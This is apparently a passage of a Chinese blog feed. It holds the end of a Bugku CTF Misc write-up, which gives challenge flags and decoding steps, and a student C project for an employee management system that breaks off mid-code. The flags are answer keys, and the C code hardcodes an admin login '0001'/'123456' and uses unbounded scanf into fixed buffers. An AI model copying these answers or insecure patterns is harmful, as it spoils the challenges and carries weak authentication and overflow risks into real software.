punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用python脚本解出来一串</p><pre class="line-numbers language-none"><code class="language-none">98，117，103，107，117，123，110，97，48，100，48，110，103，100，97，107，97，49，125<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>跟之前的那组一样转化为ascll码，就能知道flag<strong>bugku{na0d0ngdaka1}</strong></p><h5 id="20、闪的好快啊"><a href="#20、闪的好快啊" class="headerlink" title="20、闪的好快啊"></a>20、闪的好快啊</h5><pre class="line-numbers language-none"><code class="language-none">SYC&#123;F1aSh_so_f4sT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>十八张图真没必要……好在WPS图片有相应的功能将GIF图片一一分开，在通过QR research可以读取二维码里面的信息，得到flag。这里其实还有一个疑点，为什么这个GIF图片在PS里面打开是半张，在别的软件中打开是整张二维码呢？</p><blockquote><p> 文件损坏了，偶尔是会发生这种情况的，你另存为下，然后重新导出。 (百度知道如是说道，但是我还没明白……)</p></blockquote><h5 id="21、白哥的鸽子"><a href="#21、白哥的鸽子" class="headerlink" title="21、白哥的鸽子"></a>21、白哥的鸽子</h5><p>属性中没有任何可用信息，使用formost进行分解，证明没有存有其他的文件。在使用winhex打开文件看到最后有**fg2ivyo}l{2s3_o@aw__rcl@**这一串明显是一段栅栏密码…找一个有枚举解码能力的工具进行解码就得到flag</p><h5 id="22、放松一下吧-对于我这个手残来说这个根本不叫放松…"><a href="#22、放松一下吧-对于我这个手残来说这个根本不叫放松…" class="headerlink" title="22、放松一下吧::对于我这个手残来说这个根本不叫放松….."></a>22、放松一下吧::对于我这个手残来说这个根本不叫放松…..</h5>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言课程实训：员工信息管理系统</title>
      <link href="/2021/07/31/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E8%AE%AD%E4%B9%8B%E5%91%98%E5%B7%A5%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2021/07/31/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E8%AE%AD%E4%B9%8B%E5%91%98%E5%B7%A5%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="1-需求分析"><a href="#1-需求分析" class="headerlink" title="1.需求分析"></a>1.需求分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一家公司不仅应该有管理者，还应该有数量更多的普通员工，一个员工信息管理系统，不仅要有管理员操作的模块还要有员工模块。</p><h4 id="1-1员工登录"><a href="#1-1员工登录" class="headerlink" title="1.1员工登录"></a>1.1员工登录</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分需要实现员工自主查询信息的功能，但要求不能使员工更改数据库中的信息</p><h4 id="1-2管理员登录"><a href="#1-2管理员登录" class="headerlink" title="1.2管理员登录"></a>1.2管理员登录</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分要实现管理员对员工信息的管理，包括：新建员工信息、浏览员工信息、以员工号或姓名的方式查询员工信息、删除员工信息、根据各种方式筛选相应员工、修改员工信息以及退出该管理服务系统等等。每一步都将相应的数据存入二进制文件中。</p><h2 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2.系统设计"></a>2.系统设计</h2><h3 id="nbsp-nbsp-nbsp-2-1实现员工登陆查询信息系统"><a href="#nbsp-nbsp-nbsp-2-1实现员工登陆查询信息系统" class="headerlink" title="&nbsp;&nbsp;&nbsp;2.1实现员工登陆查询信息系统"></a>&nbsp;&nbsp;&nbsp;2.1实现员工登陆查询信息系统</h3><h3 id="nbsp-nbsp-nbsp-2-2实现管理员登录管理系统"><a href="#nbsp-nbsp-nbsp-2-2实现管理员登录管理系统" class="headerlink" title="&nbsp;&nbsp;&nbsp;2.2实现管理员登录管理系统"></a>&nbsp;&nbsp;&nbsp;2.2实现管理员登录管理系统</h3><h5 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块一：实现新建职工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块一：实现新建职工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块一：实现新建职工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块一：实现新建职工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以追加的形式将数据存入二进制文件，并且将从文本文件中读取的num值自增，并将num重新存入文本文件中。</p><h5 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块二：实现浏览员工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块二：实现浏览员工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块二：实现浏览员工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块二：实现浏览员工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一开始计划是只是浏览全部的员工信息，在后期的制作中，想到一个公司往往会有各种活动，需要对参与员工进行筛选，对其追加了根据年龄，工资性别的筛选功能。</p><h5 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块三：实现查询员工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块三：实现查询员工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块三：实现查询员工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块三：实现查询员工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对员工信息的查询功能包括两个方面，按员工号进行查询和按照姓名方式进行查询如果查询失败则输出没有该员工，返回操作页面。</p><h5 id="模块四：实现删除员工信息功能；"><a href="#模块四：实现删除员工信息功能；" class="headerlink" title="模块四：实现删除员工信息功能；"></a>模块四：实现删除员工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从二进制文件中将数据全部读取出来，将输入的员工号与已有数据中的员工号进行比对，当数据相同时删除该员工信息，并将全部信息重新写入文件中。</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块五：实现修改员工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块五：实现修改员工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块五：实现修改员工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块五：实现修改员工信息功能；</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该模块具体执行数据的修改，分成八个部分修改员工的各种信息。</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块六：实现退出服务系统功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块六：实现退出服务系统功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块六：实现退出服务系统功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块六：实现退出服务系统功能；</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用于结束程序的模块</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块七：实现读取已存入数据个数"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块七：实现读取已存入数据个数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块七：实现读取已存入数据个数"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块七：实现读取已存入数据个数</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于使用了一个文本文件进行辅助工作，这个程序这是读取txt格式文本文件中存储的数字，将他存入全局变量num中。</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块八：管理员登录后的操作页面；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块八：管理员登录后的操作页面；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块八：管理员登录后的操作页面；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块八：管理员登录后的操作页面；</h4><h2 id="3-详细代码"><a href="#3-详细代码" class="headerlink" title="3.详细代码"></a>3.详细代码</h2><h4 id="nbsp-nbsp-nbsp-3-1-1company-h"><a href="#nbsp-nbsp-nbsp-3-1-1company-h" class="headerlink" title="&nbsp;&nbsp;&nbsp;3.1.1company.h"></a>&nbsp;&nbsp;&nbsp;3.1.1company.h</h4><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;math.h&gt;#include&lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include&lt;windows.h&gt;#include&lt;conio.h&gt;static int NUM;struct workers&#123;        char jobNo[20];       &#x2F;&#x2F;工号        char name[15];        &#x2F;&#x2F;姓名        char sex[15];         &#x2F;&#x2F;性别        char year[15];        &#x2F;&#x2F;年龄        char position[15];    &#x2F;&#x2F;职务        char salary[15];      &#x2F;&#x2F;工资        char addr[15];        &#x2F;&#x2F;住址        char tel[15];         &#x2F;&#x2F;电话&#125;;void f_1(struct workers *workers);void f_2(struct workers *workers);void f_3(struct workers *n);void f_3_2(struct workers *workers);void f_3_1(struct workers *workers);int  f_4(struct workers *workers);void f_5(struct workers *workers);int f_6(char n);void see (void);void xtjz(void);int sign(void);int Hollow(void);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="nbsp-nbsp-nbsp-3-1-2company-c"><a href="#nbsp-nbsp-nbsp-3-1-2company-c" class="headerlink" title="&nbsp;&nbsp;&nbsp;3.1.2company.c"></a>&nbsp;&nbsp;&nbsp;3.1.2company.c</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"gongshi.h"</span></span><span class="token keyword">void</span> <span class="token function">smile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//1、系统加载界面</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t\t\t系统加载中\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span><span class="token number">19</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//使计算机进入短暂的休眠状态100毫秒</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t\t\t系统加载完成！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t\t\t  欢迎使用！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行清屏操作</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">;</span>    workers <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                  《职工信息管理系统》                   ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                 请按相应按键使用本系统！                ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.员工登录                       2.管理员模式         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> number<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> pow<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入管理员账号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入密码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/*逐次赋值,但不回显*/</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\x0d'</span><span class="token punctuation">)</span>                    <span class="token comment">/*回车则终止循环*/</span>                <span class="token punctuation">&#123;</span>                    pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\0'</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">/*以星号代替字符个数*/</span>            <span class="token punctuation">&#125;</span>            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span><span class="token string">"0001"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>pow<span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> n<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"账号或密码错误!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">f_3</span> <span class="token punctuation">(</span>workers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> n<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> n<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入正确的功能编号!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">see</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token comment">//该函数是从辅助文件中读取员工个数；</span><span class="token punctuation">&#123;</span>    FILE <span class="token operator">*</span>fp1<span class="token punctuation">;</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    fp1<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span><span class="token string">"r+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//data.txt为辅助的文本文件；</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp1<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"人数预存文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    NUM<span class="token operator">=</span><span class="token function">atoi</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token comment">//管理员页面，在程序中会反复调用；</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                   《职工信息管理系统》                  ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                       管理员页面！                      ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.新建职工信息                 2.浏览职工信息         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   3.查询职工信息                 4.删除职工信息         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   5.变更职工信息                 6.退出程序             ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">f_6</span><span class="token punctuation">(</span><span class="token keyword">char</span> n<span class="token punctuation">)</span><span class="token comment">//退出程序；</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"感谢您使用本系统，祝您工作愉快\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_1</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//以尾加法插入新的数据，并写入text.dat二进制文件中；</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token comment">//p是个指向结构体指针后面需要用到；</span>    p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//对指针p分配大小；</span>    p<span class="token operator">=</span>workers<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工号:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>jobNo<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入姓名:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入性别:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入所担任职务:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入年龄："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>p<span class="token operator">-></span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入工资:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token 